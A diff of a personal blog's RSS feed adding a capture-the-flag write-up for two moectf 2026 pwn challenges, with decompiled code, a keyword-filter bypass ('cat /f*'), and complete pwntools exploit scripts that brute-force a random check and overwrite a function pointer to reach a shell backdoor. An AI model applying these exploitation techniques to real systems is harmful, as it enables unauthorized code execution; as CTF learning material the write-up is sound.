@@ -1,4 +1,259 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周WP</title><link>https://dxfaker.top/posts/26moe1/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe1/</guid><description>我是苦手</description><pubDate>Tue, 08 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;走后门&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026moectf第一周wp</title><link>https://dxfaker.top/posts/26moe2/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe2/</guid><description>你怎么知道我又来拉屎了</description><pubDate>Wed, 09 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;onlyshell&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;说明是随机地址&lt;/p&gt;
+&lt;p&gt;再看main逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  int v3; // eax
+  __int64 v4; // rax
+  int v6; // [rsp+4h] [rbp-144h] BYREF
+  char s2[4]; // [rsp+Bh] [rbp-13Dh] BYREF
+  char v8; // [rsp+Fh] [rbp-139h]
+  char s1[4]; // [rsp+10h] [rbp-138h] BYREF
+  char v10; // [rsp+14h] [rbp-134h]
+  unsigned __int64 v11; // [rsp+118h] [rbp-30h]
+
+  v11 = __readfsqword(0x28u);
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  alarm(0x78u);
+  v8 = 0;
+  *(_DWORD *)s2 = arc4random();                 // 造了一个随机数
+  v6 = 0;
+  *(_DWORD *)s1 = 0;
+  v10 = 0;
+  __printf_chk(2, &quot;password: &quot;);
+  if ( (unsigned int)__isoc23_scanf(&quot;%u&quot;, &amp;amp;v6) != 1 )// 强制要求用户输入一个有效的无符号整数
+LABEL_14:
+    exit(0);
+  do
+    v3 = getc(stdin);
+  while ( v3 != -1 &amp;amp;&amp;amp; v3 != 10 );
+  *(_DWORD *)s1 = v6;
+  if ( strcmp(s1, s2) )
+  {
+    puts(&quot;wrong&quot;);
+    goto LABEL_14;
+  }
+  puts(&quot;only shell builtins here.&quot;);
+  while ( 1 )
+  {
+    __printf_chk(2, &quot;$ &quot;);
+    if ( !fgets(s1, 256, stdin) )
+      break;
+    s1[strcspn(s1, &quot;\n&quot;)] = 0;                  // 计算字符串中从起始位置开始连续不包含指定字符集合的子串长度。
+    if ( s1[0] )
+    {
+      if ( strpbrk(s1, &quot;`\\(){}&quot;) )             // 检索
+      {
+        puts(&quot;bad char&quot;);
+      }
+      else if ( strstr(s1, &quot;flag&quot;) )
+      {
+        puts(&quot;bad word&quot;);
+      }
+      else
+      {
+        LODWORD(v4) = fork();
+        if ( !(_DWORD)v4 )
+        {
+          execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;--noprofile&quot;, &quot;--norc&quot;, &quot;-c&quot;, s1, 0, v4);
+          _exit(1);
+        }
+        wait(0);
+      }
+    }
+  }
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;程序将 &lt;code&gt;arc4random()&lt;/code&gt; 的 4 字节写入 &lt;code&gt;char s[4]&lt;/code&gt;，然后与用户输入的字符串 &lt;code&gt;strcmp&lt;/code&gt; 比较。若用户输入 &lt;code&gt;&quot;0&quot;&lt;/code&gt;（即字符串首字节 &lt;code&gt;&apos;\0&apos;&lt;/code&gt;），当随机数的第一个字节恰好为 0 时，两个空字符串相等，验证通过。概率为 1/256，可通过多次连接暴力尝试。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;可以看出我们需要暴力枚举到随机数爆0来度过第一轮检查，然后还要经过badword筛查才能拿到flag&lt;/p&gt;
+&lt;p&gt;那我用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat /f*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我的exp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+import time
+context.log_level = &apos;error&apos;
+
+def try_once():
+    try:
+        p = process(&apos;./pwn&apos;)
+        p.recvuntil(b&apos;password: &apos;)
+        p.sendline(b&apos;0&apos;)
+        resp = p.recvline(timeout=3)
+        if b&apos;wrong&apos; in resp or b&apos;incorrect&apos; in resp:
+            p.close()
+            return None
+        else:
+            return p
+    except:
+        return None
+
+for i in range(1, 1001):
+    p = try_once()
+    if p:
+        p.sendline(b&apos;cat /f*&apos;)
+        try:
+            out = p.recvall(timeout=3).decode(errors=&apos;ignore&apos;)
+            print(out)
+        except:
+            pass
+        p.close()
+        break
+else:
+    print(&apos;失败&apos;)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;littlebee&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+   
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看main函数逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 index; // rax
+  void (*v5)(void); // [rsp+0h] [rbp-50h] BYREF
+  _QWORD v6[8]; // [rsp+8h] [rbp-48h]
+  __int64 v7; // [rsp+48h] [rbp-8h]
+
+  v5 = (void (*)(void))ordinary_bell;
+  v6[0] = 7312845;
+  v6[1] = 7312846;
+  v6[2] = 7312847;
+  v6[3] = 7312848;
+  v6[4] = 7312849;
+  v6[5] = 7312850;
+  v6[6] = 7312851;
+  v6[7] = 7312852;
+  initialise(argc, argv, envp);
+  while ( 1 )
+  {
+    show_menu();
+    index = read_index();
+    if ( index == 4 )
+      return 0;
+    if ( index &amp;gt; 4 )
+      goto LABEL_14;
+    switch ( index )
+    {
+      case 3LL:
+        v5();
+        break;
+      case 1LL:
+        show_records(&amp;amp;v5);
+        break;
+      case 2LL:
+        printf(&quot;Which shelf slot should be updated? &quot;);// 哪个货架插槽应该更新？
+        v7 = read_index();
+        if ( v7 &amp;lt;= 7 )
+        {
+          printf(&quot;What pickup code should be written there? &quot;);// 那里应该写什么收货代码？
+          v6[v7] = read_pickup_code();
+          puts(&quot;The clerk writes it down.&quot;);    // 店员把它写下来。
+        }
+        else
+        {
+          puts(&quot;That slot is not on the shelf map.&quot;);// 那个位置不在货架地图上。
+        }
+        break;
+      default:
+LABEL_14:
+        puts(&quot;The desk does not understand that request.&quot;);// 桌子不明白这个要求。
+        break;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;注意看栈分布，rbp-8到rbp-48为v6，rbp-50为*v5(指针)，且v6[v7] = read_pickup_code();&lt;/p&gt;
+&lt;p&gt;shift+F12看到有一个bin不过是.rodata上的，按X查看另外一个调用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int staff_room()
+{
+  char *argv[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  argv[0] = &quot;/bin/sh&quot;;
+  argv[1] = 0;
+  return execve(&quot;/bin/sh&quot;, argv, 0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;也就是后门&lt;/p&gt;
+&lt;p&gt;现在来看功能&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;打印v5地址(PIE的问题解决了)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;选择一个数组成员改变他的值&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;执行v5&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;退出&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;而且功能二并没有限制v7往前面写(rbp-48到rbp-50正好是2*4=8)&lt;/p&gt;
+&lt;p&gt;所以说让指针指向后门函数他会直接执行后门函数&lt;/p&gt;
+&lt;p&gt;ok，下面是攻击思路&lt;/p&gt;
+&lt;p&gt;一次是输入1让他打印地址，然后再利用算好的地址输入2再改变v6[-1]来改变他的值，最后在执行3就可以跑到后门函数&lt;/p&gt;
+&lt;p&gt;exp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+context.arch = &apos;amd64&apos;
+context.log_level = &apos;info&apos;
+
+# p = remote(&apos;127.0.0.1&apos;, 57430)
+p = process(&apos;./little-bee&apos;)
+
+ORDINARY_BELL = 0x138E
+STAFF_ROOM    = 0x13A8
+
+menu = p.recv(timeout=1)
+log.info(f&apos;menu: {menu!r}&apos;)
+
+p.sendline(b&apos;1&apos;)
+line = p.recvline()         
+leak = int(line.split(b&apos;: &apos;)[1].strip(), 16)
+log.info(f&apos;ordinary_bell = {hex(leak)}&apos;)
+
+staff_room = leak - ORDINARY_BELL + STAFF_ROOM
+log.info(f&apos;staff_room   = {hex(staff_room)}&apos;)
+
+def update(idx, code):
+    p.sendline(b&apos;2&apos;)
+    p.recvuntil(b&apos;updated? &apos;)                       
+    p.sendline(str(idx).encode())                      
+    p.recvuntil(b&apos;there? &apos;)                            
+    p.sendline(hex(code).encode())               
+
+update(-1, staff_room)
+p.sendline(b&apos;3&apos;)
+
+p.interactive()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;你得考虑这个问题，我10点才写完这俩题的WP,12点又鸡巴要断电，所以第三题我决定明天再更，哦对了静态博客是对的@へんしゅう&lt;/p&gt;
+</content:encoded></item><item><title>2026第一周WP</title><link>https://dxfaker.top/posts/26moe1/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe1/</guid><description>我是苦手</description><pubDate>Tue, 08 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;走后门&lt;/h1&gt;
 &lt;pre&gt;&lt;code&gt;ssize_t vuln()
 {
   int v1; // [rsp+Ch] [rbp-44h] BYREF
